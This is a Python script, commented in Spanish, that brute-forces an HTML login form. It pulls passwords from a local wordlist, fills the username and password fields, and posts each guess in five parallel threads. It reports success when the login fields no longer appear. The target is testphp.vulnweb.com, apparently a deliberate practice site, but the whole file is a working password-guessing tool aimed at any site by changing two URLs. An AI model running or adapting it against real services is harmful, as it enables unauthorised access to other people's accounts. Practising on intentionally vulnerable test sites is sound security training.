from html.parser import HTMLParser
import urllib.request
import urllib.parse
import queue
import threading
import sys
import os

threads = 5
username = "test"
headers = {}
target_url = "http://testphp.vulnweb.com/login.php"
post_url = "http://testphp.vulnweb.com/userinfo.php"
username_field = "uname"
password_field = "pass"

def build_passwd_q(passwd_file):
    fd = open(passwd_file, "rb")
    passwd_list = fd.readlines()
    fd.close()

    passwd_q = queue.Queue()

    if len(passwd_list):
        for passwd in passwd_list:
            passwd = passwd.decode("utf-8").rstrip()
            passwd_q.put(passwd)

        return passwd_q

class BruteForcer():
    def __init__(self, username, passwd_q):
        self.username = username
        self.passwd_q = passwd_q
        self.found = False

    def html_brute_forcer(self):
        while not passwd_q.empty() and not self.found:
            # Realiza la peticion al sitio web
            request = urllib.request.Request(target_url, headers=headers)
            response = urllib.request.urlopen(request)

            # La respuesta esta en bytes. Convertir a string y remover b''
            page = str(response.read())[2:-1]

            # Parsear el formulario HTML
            parsed_html = BruteParser()
            parsed_html.feed(page)

            if username_field in parsed_html.parsed_results.keys() and password_field in parsed_html.parsed_results.keys():
                # Coloca el usuario y la contrasenia a utilizar en el formulario de HTML
                parsed_html.parsed_results[username_field] = self.username
                parsed_html.parsed_results[password_field] = self.passwd_q.get()

                print(f"[*] Intentando {self.username}/{parsed_html.parsed_results[password_field]}")

                # Convertir a bytes
                post_data = urllib.parse.urlencode(parsed_html.parsed_results).encode()

                brute_force_request = urllib.request.Request(post_url, headers=headers)
                brute_force_response = urllib.request.urlopen(brute_force_request, data=post_data)

                # La respuesta esta en bytes. Convertir a string y remover b''
                brute_force_page = str(brute_force_response.read())[2:-1]

                # Parsear el formulario HTML
                brute_force_parsed_html = BruteParser()
                brute_force_parsed_html.feed(brute_force_page)

                print(brute_force_parsed_html.parsed_results)

                if not brute_force_parsed_html.parsed_results:
                    self.found = True
                    print("\n[*] Credenciales Identificadas!")
                    print(f"    Usuario: {self.username}")
                    print(f"    Contrasenia: {parsed_html.parsed_results[password_field]}")
                    os._exit(0)
            else:
                print("[!] Pagina HTML es Invalida")
                break

        # Si no se encontraron credenciales
        if not self.found:
            print("\n[*] Credenciales no identificadas")
            os._exit(0)


    # Fuerza Bruta con multiples hilos
    def html_brute_forcer_thread_starter(self):
        print(f"[*] Fuerza Bruta con {threads} hilos\n")
        for i in range(threads):
            html_brute_forcer_thread = threading.Thread(target=self.html_brute_forcer)
            html_brute_forcer_thread.start()

class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.parsed_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            for name, value in attrs:
                if name == "name" and value == username_field:
                    self.parsed_results[username_field] = username_field
                if name == "name" and value == password_field:
                    self.parsed_results[password_field] = password_field

print("[*] Script de Fuerza Bruta a Formularios HTML")
print("[*] Construyendo fila de contrasenias")
passwd_q = build_passwd_q("C:\\pass.txt")

if passwd_q.qsize():
    print("[*] Construccion existosa")
    attempt_brute_force = BruteForcer(username, passwd_q)
    attempt_brute_force.html_brute_forcer_thread_starter()
else:
    print("[!] Archivo de contrasenias vacio!")
    sys.exit(0)



